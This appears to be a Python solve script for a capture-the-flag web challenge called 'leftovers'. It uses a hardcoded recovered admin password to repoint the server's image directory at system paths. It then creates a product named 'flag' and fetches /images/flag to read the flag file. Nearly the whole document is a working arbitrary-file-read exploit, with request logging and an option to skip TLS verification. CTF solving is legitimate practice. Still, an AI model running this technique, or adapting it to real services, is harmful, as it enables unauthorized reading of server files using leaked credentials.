#!/usr/bin/env python3
import argparse
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import urljoin

PASSWORD = "algomaster99"
PRODUCT_NAME = "flag"
PRODUCT_JSON = {
    "name": PRODUCT_NAME,
    "quantity": 1,
    "bestBefore": "2030-01-01T00:00:00",
    "notAfter": "2030-01-02T00:00:00",
}
CANDIDATE_DIRS = ["/tmp", "/", "/app", "/home/ctf", "/home/challenge", "/challenge", "/srv"]
FLAG_RE = re.compile(rb"GPNCTF\{[^\r\n}]+\}")


def norm_base(s: str) -> str:
    s = s.strip()
    if not s.startswith(("http://", "https://")):
        s = "https://" + s
    return s.rstrip("/") + "/"


def pretty_bytes(b: bytes, limit: int = 2000) -> str:
    if not b:
        return ""
    out = b[:limit].decode("utf-8", "replace")
    if len(b) > limit:
        out += f"\n...[truncated {len(b)-limit} bytes]"
    return out


def request(base: str, method: str, path: str, data=None, timeout=10, insecure=False):
    url = urljoin(base, path.lstrip("/"))
    body = None
    headers = {}
    if data is not None:
        body = json.dumps(data, separators=(",", ":")).encode()
        headers["Content-Type"] = "application/json"
    print(f"\n>>> {method} {url}")
    if body is not None:
        print(f">>> body: {body.decode()}")
    ctx = None
    if url.startswith("https://") and insecure:
        ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            resp = r.read()
            print(f"<<< HTTP {r.status} {r.reason}")
            ct = r.headers.get("Content-Type", "")
            print(f"<<< Content-Type: {ct}")
            if resp:
                print(pretty_bytes(resp))
            return r.status, resp, None
    except urllib.error.HTTPError as e:
        resp = e.read()
        print(f"<<< HTTP {e.code} {e.reason}")
        ct = e.headers.get("Content-Type", "") if e.headers else ""
        print(f"<<< Content-Type: {ct}")
        if resp:
            print(pretty_bytes(resp))
        return e.code, resp, e
    except Exception as e:
        print(f"<<< ERROR: {type(e).__name__}: {e}")
        return None, b"", e


def try_dir(base: str, directory: str, args):
    print(f"\n===== trying image directory: {directory} =====")
    st, body, err = request(
        base,
        "POST",
        "/set-image-dir",
        {"password": PASSWORD, "newPath": directory},
        timeout=args.timeout,
        insecure=args.insecure,
    )
    if st != 200:
        print(f"[!] set-image-dir failed for {directory}; continuing")
        return None

    st, body, err = request(
        base,
        "GET",
        f"/images/{PRODUCT_NAME}",
        timeout=args.timeout,
        insecure=args.insecure,
    )
    if st == 200:
        m = FLAG_RE.search(body)
        if m:
            flag = m.group(0).decode()
            print(f"\n[+] FLAG FOUND via directory {directory}: {flag}")
            print("[+] proof: server returned HTTP 200 for GET /images/flag after setting image dir and body matches GPNCTF{...}")
            return flag
        else:
            print("[?] got HTTP 200 but body does not match GPNCTF{...}; not accepting as real flag")
    return None


def main():
    ap = argparse.ArgumentParser(description="Exploit GPN CTF leftovers challenge")
    ap.add_argument("base", help="base URL, e.g. https://host")
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--insecure", action="store_true", help="disable TLS verification")
    ap.add_argument("--dirs", default=",".join(CANDIDATE_DIRS), help="comma-separated candidate image dirs")
    args = ap.parse_args()

    base = norm_base(args.base)
    dirs = [x for x in args.dirs.split(",") if x]

    print("[+] target:", base)
    print("[+] recovered AOT password:", PASSWORD)
    print("[+] creating product named 'flag' so /images/flag resolves to <imageDir>/flag")

    # Add the product once. Duplicate add is harmless because State uses a Set.
    request(base, "PUT", f"/products/{PRODUCT_NAME}", PRODUCT_JSON, timeout=args.timeout, insecure=args.insecure)

    for d in dirs:
        flag = try_dir(base, d, args)
        if flag:
            print("\nFINAL_FLAG=" + flag)
            return 0

    print("\n[-] No valid GPNCTF{...} flag found in tried directories.")
    print("[-] Try adding more candidate directories with --dirs /tmp,/,/app,...")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
